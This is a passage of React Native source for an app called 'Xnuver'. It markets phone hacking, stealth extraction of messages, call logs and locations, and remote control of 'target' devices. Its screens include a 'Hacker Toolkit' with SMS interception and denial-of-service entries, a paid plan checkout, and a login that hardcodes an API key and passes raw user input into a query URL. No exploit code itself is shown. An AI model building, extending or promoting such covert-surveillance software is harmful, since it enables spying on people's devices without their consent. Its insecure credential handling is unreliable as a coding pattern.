import React, { useState, useRef, useEffect } from 'react';
import {
    StyleSheet,
    Text,
    View,
    Image,
    ImageBackground,
    TouchableOpacity,
    ScrollView,
    Dimensions,
    SafeAreaView,
    StatusBar,
    Animated,
    PanResponder,
    FlatList,
    TextInput,
    Alert,
    ActivityIndicator
} from 'react-native';
import Svg, { Path, Defs, LinearGradient, Stop } from 'react-native-svg';
import {
    ChevronRight,
    Lock,
    Bell,
    CloudRain,
    Volume2,
    Video,
    Lightbulb,
    Mic,
    ArrowLeft,
    MoreVertical,
    Home,
    LayoutGrid,
    CreditCard,
    Settings,
    Power,
    Zap,
    Music,
    MessageSquare,
    Mail,
    ShieldCheck,
    Shield,
    Smartphone,
    Activity,
    Wifi,
    Cpu,
    CheckCircle,
    Copy,
    Eye,
    EyeOff,
    Trash2,
    ChevronUp,
    Image as ImageIcon
} from 'lucide-react-native';

const { width: windowWidth, height: windowHeight } = Dimensions.get('window');
const width = windowWidth || 375;
const height = windowHeight || 812;

// --- Supabase REST API Configuration ---
const SUPABASE_URL = 'https://ejqrvmkjypdfqiiwyxkp.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVqcXJ2bWtqeXBkZnFpaXd5eGtwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc5MzM0NDEsImV4cCI6MjA4MzUwOTQ0MX0.sDOLfczDLK4RNIHFLP-kG1_rnZNWhE4XFImruLBr8oA';
const SUPABASE_REST_URL = `${SUPABASE_URL}/rest/v1`;

// --- Colors & Constants ---
const COLORS = {
    bgDark: '#121212',
    bgCharcoal: '#1A1A1A',
    primary: '#CCFF00',
    textPrimary: '#FFFFFF',
    textSecondary: 'rgba(255, 255, 255, 0.6)',
    glassBg: 'rgba(255, 255, 255, 0.08)',
    glassBorder: 'rgba(255, 255, 255, 0.1)',
    sheetBg: 'rgba(26, 26, 26, 0.95)', // Less transparent background
};

const CONTROLLER_ID = 'XNV-8892'; // Unique ID for this controller instance

const ONBOARDING_DATA = [
    {
        id: '1',
        title: 'Hack Any Phone With Xnuver Apps',
        description: 'Gain total access and control over any device using our advanced xnuver toolset.',
        image: 'https://images.unsplash.com/photo-1600585154340-be6161a56a0c?q=80&w=2070&auto=format&fit=crop'
    },
    {
        id: '2',
        title: 'Bypass High Security Protocols',
        description: 'Effortlessly penetrate secure networks and encrypted mobile OS with xnuver.',
        image: 'https://images.unsplash.com/photo-1558002038-1055907df827?q=80&w=2070&auto=format&fit=crop'
    },
    {
        id: '3',
        title: 'Stealth Data Monitoring',
        description: 'Extract call logs, messages, and locations in real-time without being detected.',
        image: 'https://images.unsplash.com/photo-1558002038-1055907df827?q=80&w=2070&auto=format&fit=crop'
    },
    {
        id: '4',
        title: 'Global Remote Access',
        description: 'Manage your connected targets from anywhere in the world using our cloud infrastructure.',
        image: 'https://images.unsplash.com/photo-1513694203232-719a280e022f?q=80&w=2069&auto=format&fit=crop'
    }
];

// --- Reusable Components ---

const GlassCard = ({ children, style, onPress }) => (
    <View style={[styles.glass, styles.cardRounded, style]}>
        {children}
    </View>
);

const PillButton = ({ children, primary, onPress, style }) => (
    <TouchableOpacity
        onPress={onPress}
        style={[
            styles.pillRounded,
            primary ? styles.btnPrimary : styles.btnSecondary,
            style
        ]}>
        {children}
    </TouchableOpacity>
);

const SlideButton = ({ onSlideComplete }) => {
    const slideX = useRef(new Animated.Value(0)).current;
    const [containerWidth, setContainerWidth] = useState(0);
    const handleWidth = 52;
    const padding = 8;

    // Use a ref to store the latest maxSlide to avoid stale closures in PanResponder
    const maxSlide = Math.max(0, containerWidth - handleWidth - padding);
    const maxSlideRef = useRef(0);
    // Update ref whenever maxSlide changes
    useEffect(() => {
        maxSlideRef.current = maxSlide;
    }, [maxSlide]);

    const panResponder = useRef(
        PanResponder.create({
            onStartShouldSetPanResponder: () => true,
            onMoveShouldSetPanResponder: () => true,
            onPanResponderMove: (_, gestureState) => {
                const currentMax = maxSlideRef.current;
                if (currentMax > 0) {
                    const newValue = gestureState.dx;
                    if (newValue >= 0 && newValue <= currentMax) {
                        slideX.setValue(newValue);
                    } else if (newValue > currentMax) {
                        slideX.setValue(currentMax);
                    } else if (newValue < 0) {
                        slideX.setValue(0);
                    }
                }
            },
            onPanResponderRelease: (_, gestureState) => {
                const currentMax = maxSlideRef.current;
                if (currentMax > 0 && gestureState.dx > currentMax * 0.7) {
                    Animated.timing(slideX, {
                        toValue: currentMax,
                        duration: 150,
                        useNativeDriver: false,
                    }).start(() => onSlideComplete?.());
                } else {
                    Animated.spring(slideX, {
                        toValue: 0,
                        useNativeDriver: false,
                        bounciness: 0,
                    }).start();
                }
            },
        })
    ).current;

    const textOpacity = slideX.interpolate({
        inputRange: [0, Math.max(1, maxSlide * 0.5)],
        outputRange: [1, 0],
        extrapolate: 'clamp',
    });

    return (
        <View
            style={styles.slideContainer}
            onLayout={(e) => setContainerWidth(e.nativeEvent.layout.width)}
        >
            {/* Dynamic Fill Background */}
            <Animated.View
                style={[
                    styles.slideFill,
                    {
                        width: slideX.interpolate({
                            inputRange: [0, Math.max(1, maxSlide)],
                            outputRange: [handleWidth, containerWidth - padding],
                            extrapolate: 'clamp',
                        })
                    }
                ]}
            />

            <Animated.View style={[styles.slideTrack, { opacity: textOpacity }]}>
                <Text style={styles.slideText}>Swipe to Get Started</Text>
            </Animated.View>
            <Animated.View
                {...panResponder.panHandlers}
                style={[
                    styles.slideHandle,
                    { transform: [{ translateX: slideX }] }
                ]}
            >
                <Lock size={18} color="#000" />
            </Animated.View>
        </View>
    );
};

// --- Screens ---

const OnboardingScreen = ({ onStart }) => {
    const [activeIndex, setActiveIndex] = useState(0);
    const flatListRef = useRef(null);
    const [currentIndex, setCurrentIndex] = useState(0);
    const scrollX = useRef(new Animated.Value(0)).current;

    return (
        <View style={styles.screen}>
            <FlatList
                data={ONBOARDING_DATA}
                horizontal
                pagingEnabled
                showsHorizontalScrollIndicator={false}
                onScroll={Animated.event(
                    [{ nativeEvent: { contentOffset: { x: scrollX } } }],
                    { useNativeDriver: false }
                )}
                onMomentumScrollEnd={(e) => {
                    const index = Math.round(e.nativeEvent.contentOffset.x / width);
                    setCurrentIndex(index);
                }}
                renderItem={({ item }) => (
                    <View style={{ width, height }}>
                        <Image
                            source={{ uri: item.image }}
                            style={styles.onboardingImage}
                            resizeMode="cover"
                        />
                        <View style={styles.onboardingOverlay} />
                    </View>
                )}
                keyExtractor={(item) => item.id}
            />

            <View style={styles.onboardingContent}>
                <View style={[styles.glass, styles.onboardingSheet]}>
                    <View style={styles.pagination}>
                        {ONBOARDING_DATA.map((_, i) => (
                            <View
                                key={i}
                                style={[
                                    styles.paginationDot,
                                    currentIndex === i && styles.paginationDotActive
                                ]}
                            />
                        ))}
                    </View>

                    <Text style={styles.onboardingTitle}>{ONBOARDING_DATA[currentIndex]?.title || ''}</Text>
                    <Text style={styles.onboardingDesc}>{ONBOARDING_DATA[currentIndex]?.description || ''}</Text>

                    <SlideButton
                        onSlideComplete={() => onStart('login')}
                    />
                </View>
            </View>
        </View>
    );
};

const LoginScreen = ({ onLogin }) => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [loading, setLoading] = useState(false);

    const handleLoginPress = async () => {
        if (!email || !password) {
            Alert.alert('Error', 'Please enter both email and access key');
            return;
        }

        setLoading(true);
        try {
            const response = await fetch(`${SUPABASE_REST_URL}/app_accounts?email=eq.${email.trim()}&access_key=eq.${password.trim()}`, {
                method: 'GET',
                headers: {
                    'apikey': SUPABASE_ANON_KEY,
                    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                    'Content-Type': 'application/json'
                }
            });

            if (response.ok) {
                const data = await response.json();
                if (data && data.length > 0) {
                    onLogin(data[0]); // Pass user data to main app
                } else {
                    Alert.alert('Access Denied', 'Invalid email or access key. Please contact admin.');
                }
            } else {
                const error = await response.text();
                console.error('AUTH_ERROR:', error);
                Alert.alert('System Error', 'Could not connect to authentication server');
            }
        } catch (err) {
            console.error('LOGIN_ERR:', err);
            Alert.alert('Error', 'Network error occurred during login');
        } finally {
            setLoading(false);
        }
    };

    return (
        <SafeAreaView style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <ScrollView contentContainerStyle={{ flexGrow: 1, justifyContent: 'center', padding: 24 }}>
                <View style={{ alignItems: 'center', marginBottom: 40 }}>
                    <View style={[styles.glass, styles.iconBtn, { width: 80, height: 80, borderRadius: 40, borderStyle: 'dashed', borderWidth: 1, borderColor: COLORS.primary }]}>
                        <Lock size={40} color={COLORS.primary} />
                    </View>
                    <Text style={[styles.onboardingTitle, { marginTop: 24, fontSize: 32, textAlign: 'center' }]}>Authenticate</Text>
                    <Text style={styles.loginTitleSecondary}>Access the Xnuver Secure Terminal</Text>
                </View>

                <GlassCard style={styles.loginCard}>
                    <Text style={styles.loginSectionTitle}>Sign In</Text>

                    <View style={styles.loginInputContainer}>
                        <Mail size={20} color={COLORS.primary} />
                        <TextInput
                            style={styles.loginInput}
                            placeholder="Email / Username"
                            placeholderTextColor="rgba(255,255,255,0.3)"
                            value={email}
                            onChangeText={setEmail}
                            autoCapitalize="none"
                        />
                    </View>

                    <View style={styles.loginInputContainer}>
                        <ShieldCheck size={20} color={COLORS.primary} />
                        <TextInput
                            style={styles.loginInput}
                            placeholder="Access Key"
                            placeholderTextColor="rgba(255,255,255,0.3)"
                            secureTextEntry={!showPassword}
                            value={password}
                            onChangeText={setPassword}
                        />
                        <TouchableOpacity
                            onPress={() => setShowPassword(!showPassword)}
                            style={{ padding: 8 }}
                        >
                            {showPassword ? (
                                <EyeOff size={20} color={COLORS.textSecondary} />
                            ) : (
                                <Eye size={20} color={COLORS.textSecondary} />
                            )}
                        </TouchableOpacity>
                    </View>

                    <TouchableOpacity
                        style={[styles.loginButton, loading && { opacity: 0.7 }]}
                        onPress={handleLoginPress}
                        disabled={loading}
                    >
                        <Text style={styles.loginButtonText}>
                            {loading ? 'ESTABLISHING SECURE LINK...' : 'ESTABLISH CONNECTION'}
                        </Text>
                        <ChevronRight size={20} color="#fff" style={{ marginLeft: 8 }} />
                    </TouchableOpacity>
                </GlassCard>

                <TouchableOpacity style={styles.loginFooterLink}>
                    <Text style={styles.loginFooterText}>Request terminal access? <Text style={styles.loginFooterLinkText}>Contact Admin</Text></Text>
                </TouchableOpacity>
            </ScrollView>
        </SafeAreaView>
    );
};


const ValidityCard = ({ daysLeft, planName }) => {
    return (
        <View style={vcStyles.container}>
            <View style={vcStyles.card}>
                <Svg height="175" width="100%" style={vcStyles.background} preserveAspectRatio="none">
                    <Defs>
                        <LinearGradient id="paint0_linear_103_640" x1="0" y1="0" x2="100%" y2="100%">
                            <Stop offset="0" stopColor="#CCFF00" />
                            <Stop offset="1" stopColor="#99BB00" />
                        </LinearGradient>
                    </Defs>
                    <Path
                        fill="url(#paint0_linear_103_640)"
                        d="M0 66.4396C0 31.6455 0 14.2484 11.326 5.24044C22.6519 -3.76754 39.6026 0.147978 73.5041 7.97901L307.903 62.1238C324.259 65.9018 332.436 67.7909 337.218 73.8031C342 79.8154 342 88.2086 342 104.995V131C342 151.742 342 162.113 335.556 168.556C329.113 175 318.742 175 298 175H44C23.2582 175 12.8873 175 6.44365 168.556C0 162.113 0 151.742 0 131V66.4396Z"
                        scaleX={1.25}
                    />
                </Svg>

                <View style={vcStyles.cloudContainer}>
                    <Svg width="100" height="100" viewBox="0 0 64 64">
                        <Path fill="#75d6ff" d="M10.8 42.9c-.5 1.5-.1 3 1 3.4c1.1.4 2.4-.5 3-2c.6-1.8.7-4.1.2-6.9c-2.1 1.9-3.6 3.8-4.2 5.5" />
                        <Path fill="#75d6ff" d="M13.2 57.4c.6-1.8.7-4.1.2-6.9c-2.1 1.8-3.6 3.7-4.2 5.5c-.5 1.5-.1 3 1 3.4c1.1.4 2.5-.5 3-2" />
                        <Path fill="#75d6ff" d="M51.5 37.4c-2.1 1.8-3.6 3.7-4.2 5.5c-.5 1.5-.1 3 1 3.4c1.1.4 2.4-.5 3-2c.5-1.7.6-4.1.2-6.9" />
                        <Path fill="#75d6ff" d="M38.2 55.9c-.5 1.5-.1 3 1 3.4s2.4-.5 3-2c.6-1.8.7-4.1.2-6.9c-2 1.9-3.5 3.8-4.2 5.5" />
                        <Path fill="#75d6ff" d="M46.9 55.9c-.5 1.5-.1 3 1 3.4s2.4-.5 3-2c.6-1.8.7-4.1.2-6.9c-2.1 1.9-3.6 3.8-4.2 5.5" />
                        <Path fill="#75d6ff" d="M18.6 55.9c-.5 1.5-.1 3 1 3.4s2.4-.5 3-2c.6-1.8.7-4.1.2-6.9c-2.1 1.9-3.6 3.8-4.2 5.5" />
                        <Path fill="#ffce31" d="M24.5 31.9l-4.9 16.2h12.5L27.9 62l16.5-20.2H32.5l2.9-9.9z" />
                        <Path fill="#ffffff" d="M18.2 32.5c-.8 0-1.6-.1-2.4-.4c-3.1-1-5.3-3.9-5.3-7.2c0-2.2 1-4.3 2.6-5.7c.4-.4.9-.7 1.4-1l.5-1.8c1.3-4.4 5.4-7.5 10-7.5c.5 0 .9 0 1.5.1c.4.1.8.1 1.2.3l.2-.4c1.9-3.3 5.4-5.4 9.2-5.4C43 3.5 47.7 8.2 47.7 14v1c.4.2.9.4 1.3.6c2.8 1.6 4.5 4.6 4.5 7.8c0 4.2-2.9 7.8-7 8.8c-.7.2-1.4.2-2 .2H18.2z" />
                        <Path fill="#b6c1d1" d="M37.1 5c5 0 9 4 9 8.9v.7c-2.1.2-4 1-5.4 2.3c1.1-.6 2.4-1 3.7-1c.5 0 1 .1 1.5.1c.8.2 1.6.5 2.3.9c2.3 1.3 3.8 3.7 3.8 6.5c0 3.6-2.5 6.5-5.8 7.3c-.7.2-1.2.3-1.8.3H18.2c-.7 0-1.3-.1-1.9-.3c-2.4-.8-4.2-3.1-4.2-5.8c0-1.8.8-3.5 2.1-4.6c.6-.5 1.3-.9 2-1.2c.6-.2 1.3-.3 2-.3c2 0 3.7.9 4.9 2.4h.1c-1.3-2.4-3.7-4.1-6.6-4.3c1.1-3.7 4.5-6.4 8.5-6.4c.4 0 .9 0 1.3.1c.8.1 1.6.3 2.3.7c2.7 1.2 4.7 3.7 5.1 6.8V18c0-3.4-1.8-6.5-4.5-8.3C30.8 6.9 33.8 5 37.1 5m0-3C33 2 29.2 4.1 27 7.6h-.3c-.6-.1-1.2-.1-1.7-.1c-5.3 0-10 3.5-11.4 8.6l-.3 1.2c-.4.2-.7.5-1.1.8c-2 1.7-3.1 4.2-3.1 6.9c0 4 2.5 7.4 6.3 8.7c.9.3 1.9.5 2.9.5h26.2c.8 0 1.6-.1 2.4-.3c4.8-1.1 8.2-5.3 8.2-10.3c0-3.8-2-7.3-5.3-9.1c-.2-.1-.3-.2-.5-.3v-.1C49.2 7.4 43.8 2 37.1 2z" />
                    </Svg>
                </View>

                <View style={vcStyles.content}>
                    <Text style={vcStyles.mainText}>{daysLeft}</Text>
                    <View style={vcStyles.footer}>
                        <View>
                            <Text style={vcStyles.validityLabel}>Account Validity</Text>
                            <Text style={vcStyles.planText}>{planName}</Text>
                        </View>
                        <Text style={vcStyles.statusText}>ACTIVE</Text>
                    </View>
                </View>
            </View>
        </View>
    );
};

const vcStyles = StyleSheet.create({
    container: {
        width: '100%',
        height: 184,
        marginVertical: 10,
    },
    card: {
        flex: 1,
        borderRadius: 24,
        overflow: 'hidden',
        position: 'relative',
        paddingHorizontal: 25,
        paddingVertical: 24,
    },
    background: {
        position: 'absolute',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
    },
    cloudContainer: {
        position: 'absolute',
        top: -10,
        right: 0,
    },
    content: {
        flex: 1,
        justifyContent: 'space-between',
    },
    mainText: {
        fontSize: 52,
        color: '#fff',
        fontWeight: '700',
    },
    footer: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'flex-end',
    },
    validityLabel: {
        color: 'rgba(235, 235, 245, 0.6)',
        fontSize: 12,
        marginBottom: 2,
    },
    planText: {
        color: '#fff',
        fontSize: 14,
        fontWeight: '600',
    },
    statusText: {
        color: '#fff',
        fontSize: 14,
        fontWeight: '600',
    }
});

const DashboardScreen = ({ onSelectRoom, onSelectQuickAccess, selectedDevice, currentScreen, onNavigate, availableDevices, currentUser }) => (
    <SafeAreaView style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
        <StatusBar
            barStyle="light-content"
            backgroundColor="transparent"
            translucent={true}
        />
        <ScrollView contentContainerStyle={styles.scrollContent}>
            <View style={styles.header}>
                <View style={styles.userProfile}>
                    <Image source={{ uri: 'https://i.pravatar.cc/100' }} style={styles.avatar} />
                    <View>
                        <Text style={styles.textSecondary}>Hello,</Text>
                        <Text style={styles.userName}>{currentUser ? currentUser.email.split('@')[0].toUpperCase() : 'USER'}</Text>
                    </View>
                </View>
                <TouchableOpacity style={[styles.glass, styles.iconBtn]}>
                    <Bell size={20} color="#fff" />
                    <View style={styles.notifDot} />
                </TouchableOpacity>
            </View>

            <ValidityCard
                daysLeft={`${currentUser?.validity_days || '28'} Days`}
                planName={currentUser?.plan || 'PREMIUM HACK'}
            />

            <View style={styles.sectionHeader}>
                <Text style={styles.sectionTitle}>Quick Access</Text>
                <Text style={styles.linkText}>Change</Text>
            </View>

            <View style={styles.quickGrid}>
                {[
                    { icon: Zap, label: 'Flashlight' },
                    { icon: Music, label: 'Music Hack' },
                    { icon: MessageSquare, label: 'TTS Hack' },
                    { icon: Mail, label: 'SMS Monitor' }
                ].map((item, i) => (
                    <TouchableOpacity
                        key={i}
                        style={styles.quickItem}
                        onPress={() => {
                            if (item.label === 'Flashlight') onSelectQuickAccess('flashlight');
                            if (item.label === 'Music Hack') onSelectQuickAccess('music');
                            if (item.label === 'TTS Hack') onSelectQuickAccess('tts');
                            if (item.label === 'SMS Monitor') onSelectQuickAccess('sms');
                        }}
                    >
                        <View style={[styles.glass, styles.quickIconWrap]}>
                            <item.icon size={24} color={COLORS.primary} />
                        </View>
                        <Text style={styles.quickLabel}>{item.label}</Text>
                    </TouchableOpacity>
                ))}
            </View>

            {selectedDevice && (
                <View style={styles.activeTargetContainer}>
                    <GlassCard style={styles.activeTargetCard}>
                        <View style={styles.activeTargetRow}>
                            <View style={styles.activeTargetIcon}>
                                <Smartphone size={20} color="#000" />
                            </View>
                            <View style={{ flex: 1 }}>
                                <Text style={styles.activeTargetLabel}>ACTIVE TARGET</Text>
                                <Text style={styles.activeTargetName}>{selectedDevice.name}</Text>
                            </View>
                            <View style={styles.onlineBadge}>
                                <View style={styles.onlineDot} />
                                <Text style={styles.onlineText}>ONLINE</Text>
                            </View>
                        </View>
                    </GlassCard>
                </View>
            )}

            <TouchableOpacity onPress={() => onSelectRoom('target_selection')} style={{ marginTop: 24, paddingHorizontal: 24 }}>
                <GlassCard style={styles.activeTargetCard}>
                    <View style={styles.activeTargetRow}>
                        <View style={[styles.glass, styles.quickIconWrap, { width: 44, height: 44, borderRadius: 12 }]}>
                            <Smartphone size={22} color={COLORS.primary} />
                        </View>
                        <View style={{ flex: 1 }}>
                            <Text style={styles.roomTitle}>Target Devices</Text>
                            <Text style={styles.textSecondary}>{availableDevices.length} Targets online</Text>
                        </View>
                        <View style={[styles.btnPrimary, { width: 36, height: 36, borderRadius: 18, paddingHorizontal: 0 }]}>
                            <ChevronRight size={20} color="#000" />
                        </View>
                    </View>
                </GlassCard>
            </TouchableOpacity>
        </ScrollView>

        <BottomNav currentScreen={currentScreen} onNavigate={onNavigate} />
    </SafeAreaView>
);

const BottomNav = ({ currentScreen, onNavigate }) => (
    <View style={styles.bottomNavContainer}>
        <View style={[styles.glass, styles.bottomNav]}>
            <TouchableOpacity
                style={[styles.navItem, currentScreen === 'dashboard' && styles.navItemActive]}
                onPress={() => onNavigate('dashboard')}
            >
                <Home size={20} color={currentScreen === 'dashboard' ? "#000" : COLORS.textSecondary} />
                {currentScreen === 'dashboard' && <Text style={styles.navTextActive}>Home</Text>}
            </TouchableOpacity>
            <TouchableOpacity
                style={[styles.navItem, currentScreen === 'tools' && styles.navItemActive]}
                onPress={() => onNavigate('tools')}
            >
                <LayoutGrid size={20} color={currentScreen === 'tools' ? "#000" : COLORS.textSecondary} />
                {currentScreen === 'tools' && <Text style={styles.navTextActive}>Tools</Text>}
            </TouchableOpacity>
            <TouchableOpacity
                style={[styles.navItem, currentScreen === 'pricing' && styles.navItemActive]}
                onPress={() => onNavigate('pricing')}
            >
                <CreditCard size={20} color={currentScreen === 'pricing' ? "#000" : COLORS.textSecondary} />
                {currentScreen === 'pricing' && <Text style={styles.navTextActive}>Price</Text>}
            </TouchableOpacity>
            <TouchableOpacity
                style={[styles.navItem, currentScreen === 'settings' && styles.navItemActive]}
                onPress={() => onNavigate('settings')}
            >
                <Settings size={20} color={currentScreen === 'settings' ? "#000" : COLORS.textSecondary} />
                {currentScreen === 'settings' && <Text style={styles.navTextActive}>Settings</Text>}
            </TouchableOpacity>
        </View>
    </View>
);

const ToolsGridScreen = ({ onSelectTool, currentScreen, onNavigate }) => {
    const tools = [
        { id: 'flashlight', icon: Zap, label: 'Flashlight', desc: 'Hardware Toggle' },
        { id: 'music', icon: Music, label: 'Music Hack', desc: 'Audio Stream' },
        { id: 'tts', icon: MessageSquare, label: 'TTS Hack', desc: 'Voice Broadcast' },
        { id: 'sms', icon: Mail, label: 'SMS Monitor', desc: 'Data Intercept' },
        { id: 'wallpaper', icon: ImageIcon, label: 'Wallpaper Hack', desc: 'Remote Layout' },
        { id: 'wifi', icon: Wifi, label: 'WiFi Hack', desc: 'Network Access' },
        { id: 'alert_hack', icon: Bell, label: 'Alert Injection', desc: 'Custom UI Popup' },
        { id: 'cpu', icon: Cpu, label: 'CPU Overload', desc: 'System Denial' },
    ];

    return (
        <SafeAreaView style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <View style={[styles.header, { paddingHorizontal: 24 }]}>
                <Text style={[styles.userName, { fontSize: 24 }]}>Hacker Toolkit</Text>
                <TouchableOpacity style={[styles.glass, styles.iconBtn]}>
                    <Activity size={20} color={COLORS.primary} />
                </TouchableOpacity>
            </View>

            <ScrollView contentContainerStyle={{ paddingBottom: 120 }}>
                <View style={styles.toolsGridWrapper}>
                    {tools.map((tool) => (
                        <TouchableOpacity
                            key={tool.id}
                            style={styles.toolGridItem}
                            onPress={() => {
                                if (['cpu'].includes(tool.id)) {
                                    Alert.alert('Information', 'Fitur ini dalam tahap pengembangan');
                                } else {
                                    onSelectTool(tool.id);
                                }
                            }}
                        >
                            <GlassCard style={styles.toolGridCard}>
                                <View style={styles.toolIconBox}>
                                    <tool.icon size={24} color={COLORS.primary} />
                                </View>
                                <Text style={styles.toolLabelText}>{tool.label}</Text>
                                <Text style={styles.toolDescText}>{tool.desc}</Text>
                            </GlassCard>
                        </TouchableOpacity>
                    ))}
                </View>
            </ScrollView>

            <BottomNav currentScreen={currentScreen} onNavigate={onNavigate} />
        </SafeAreaView>
    );
};

const PricingScreen = ({ onSelectPackage, currentScreen, onNavigate }) => {
    const packages = [
        { id: '7days', name: 'Lite Access', days: 7, price: 'Rp 10.000', icon: Zap },
        { id: '30days', name: 'Pro Hack', days: 30, price: 'Rp 50.000', icon: ShieldCheck, popular: true },
        { id: 'lifetime', name: 'Elite Master', days: 'Perm', price: 'Rp 100.000', icon: Cpu },
    ];

    return (
        <SafeAreaView style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <View style={[styles.header, { paddingHorizontal: 24 }]}>
                <Text style={[styles.userName, { fontSize: 24 }]}>Account Extension</Text>
                <TouchableOpacity style={[styles.glass, styles.iconBtn]}>
                    <CreditCard size={20} color={COLORS.primary} />
                </TouchableOpacity>
            </View>

            <ScrollView contentContainerStyle={{ paddingBottom: 120, paddingHorizontal: 24 }}>
                <Text style={[styles.sectionTitle, { marginBottom: 20 }]}>Select Plan</Text>
                {packages.map((pkg) => (
                    <TouchableOpacity
                        key={pkg.id}
                        style={{ marginBottom: 16 }}
                        onPress={() => onSelectPackage(pkg)}
                    >
                        <GlassCard style={[styles.pricingCard, pkg.popular && styles.pricingCardPopular]}>
                            {pkg.popular && (
                                <View style={styles.popularBadge}>
                                    <Text style={styles.popularText}>MOST POPULAR</Text>
                                </View>
                            )}
                            <View style={styles.pricingRow}>
                                <View style={styles.pkgIconBox}>
                                    <pkg.icon size={24} color={COLORS.primary} />
                                </View>
                                <View style={{ flex: 1 }}>
                                    <Text style={styles.pkgName}>{pkg.name}</Text>
                                    <Text style={styles.pkgDays}>{pkg.days === 'Perm' ? 'Permanent Access' : `${pkg.days} Days Validity`}</Text>
                                </View>
                                <View style={{ alignItems: 'flex-end' }}>
                                    <Text style={styles.pkgPrice}>{pkg.price}</Text>
                                    <View style={styles.buyBtnSmall}>
                                        <Text style={styles.buyBtnTextSmall}>BUY</Text>
                                    </View>
                                </View>
                            </View>
                        </GlassCard>
                    </TouchableOpacity>
                ))}
            </ScrollView>

            <BottomNav currentScreen={currentScreen} onNavigate={onNavigate} />
        </SafeAreaView>
    );
};

const PaymentMethodScreen = ({ selectedPackage, onSelectMethod, onBack }) => (
    <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
        <SafeAreaView style={styles.roomHeaderWrap}>
            <View style={styles.roomHeader}>
                <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                    <ArrowLeft size={20} color="#fff" />
                </TouchableOpacity>
                <Text style={styles.roomHeaderTitle}>Checkout</Text>
                <View style={{ width: 48 }} />
            </View>
        </SafeAreaView>

        <View style={{ flex: 1, padding: 24, justifyContent: 'center' }}>
            <GlassCard style={{ padding: 24, marginBottom: 24 }}>
                <Text style={styles.activeTargetLabel}>SELECTED PLAN</Text>
                <View style={styles.pricingRow}>
                    <Text style={styles.pkgName}>{selectedPackage.name}</Text>
                    <Text style={styles.pkgPriceFocus}>{selectedPackage.price}</Text>
                </View>
            </GlassCard>

            <Text style={[styles.sectionTitle, { marginBottom: 16 }]}>Payment Method</Text>

            <TouchableOpacity style={{ marginBottom: 12 }} onPress={() => onSelectMethod('gopay')}>
                <GlassCard style={styles.paymentMethodCard}>
                    <View style={styles.paymentMethodRow}>
                        <View style={[styles.pkgIconBox, { backgroundColor: '#00AED6' }]}>
                            <Smartphone size={20} color="#fff" />
                        </View>
                        <Text style={styles.paymentMethodText}>GoPay</Text>
                    </View>
                </GlassCard>
            </TouchableOpacity>

            <TouchableOpacity onPress={() => onSelectMethod('qris')}>
                <GlassCard style={styles.paymentMethodCard}>
                    <View style={styles.paymentMethodRow}>
                        <View style={[styles.pkgIconBox, { backgroundColor: '#E21C22' }]}>
                            <LayoutGrid size={20} color="#fff" />
                        </View>
                        <Text style={styles.paymentMethodText}>QRIS</Text>
                    </View>
                </GlassCard>
            </TouchableOpacity>

            <TouchableOpacity
                style={[styles.btnPrimary, styles.pillRounded, { marginTop: 40, width: '100%' }]}
                onPress={() => onSelectMethod('confirm')}
            >
                <Text style={styles.buttonText}>BUY THIS PACKAGE</Text>
                <ChevronRight size={20} color="#000" />
            </TouchableOpacity>
        </View>
    </View>
);

const QRISPaymentScreen = ({ onFinish }) => (
    <View style={styles.screen}>
        <SafeAreaView style={styles.roomHeaderWrap}>
            <View style={styles.roomHeader}>
                <View style={{ width: 48 }} />
                <Text style={styles.roomHeaderTitle}>Scan QRIS</Text>
                <View style={{ width: 48 }} />
            </View>
        </SafeAreaView>

        <View style={{ flex: 1, alignItems: 'center', justifyContent: 'center', padding: 24 }}>
            <GlassCard style={{ padding: 20, alignItems: 'center', borderRadius: 32 }}>
                <Image
                    source={{ uri: 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=XNUVER_PREMIUM_HACK' }}
                    style={{ width: 280, height: 280, borderRadius: 16, backgroundColor: '#fff' }}
                />
                <Text style={[styles.pkgName, { marginTop: 20 }]}>Scan to Pay</Text>
                <Text style={styles.textSecondary}>Follow the instructions in your e-wallet</Text>
            </GlassCard>

            <TouchableOpacity
                style={[styles.btnPrimary, styles.pillRounded, { marginTop: 40, paddingHorizontal: 40 }]}
                onPress={onFinish}
            >
                <CheckCircle size={20} color="#fff" />
                <Text style={[styles.buttonText, { marginLeft: 8 }]}>I'VE PAID</Text>
            </TouchableOpacity>
        </View>
    </View>
);

const AboutDevScreen = ({ onBack }) => (
    <SafeAreaView style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
        <View style={styles.roomHeaderWrap}>
            <View style={styles.roomHeader}>
                <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                    <ArrowLeft size={20} color="#fff" />
                </TouchableOpacity>
                <Text style={styles.roomHeaderTitle}>About Developer</Text>
                <View style={{ width: 48 }} />
            </View>
        </View>

        <View style={[styles.aboutDevContent, { flex: 1, justifyContent: 'center' }]}>
            <View style={[styles.glass, styles.aboutDevCard]}>
                <View style={styles.aboutDevIconBox}>
                    <ShieldCheck size={48} color={COLORS.primary} />
                </View>

                <Text style={styles.aboutDevTitle}>Xnuver Lead</Text>
                <Text style={styles.aboutDevSubtitle}>UNP^D BLACK HAT</Text>

                <View style={styles.separator} />

                <View style={styles.aboutDevInfoSection}>
                    <View style={styles.settingsRow}>
                        <Text style={{ flex: 1, color: 'rgba(255,255,255,0.7)' }}>Version</Text>
                        <Text style={{ color: '#fff' }}>1.0.4 Premium</Text>
                    </View>
                    <View style={[styles.settingsRow, { marginTop: 16 }]}>
                        <Text style={{ flex: 1, color: 'rgba(255,255,255,0.7)' }}>Encryption</Text>
                        <Text style={{ color: '#fff' }}>AES-256 Bit</Text>
                    </View>
                </View>
            </View>

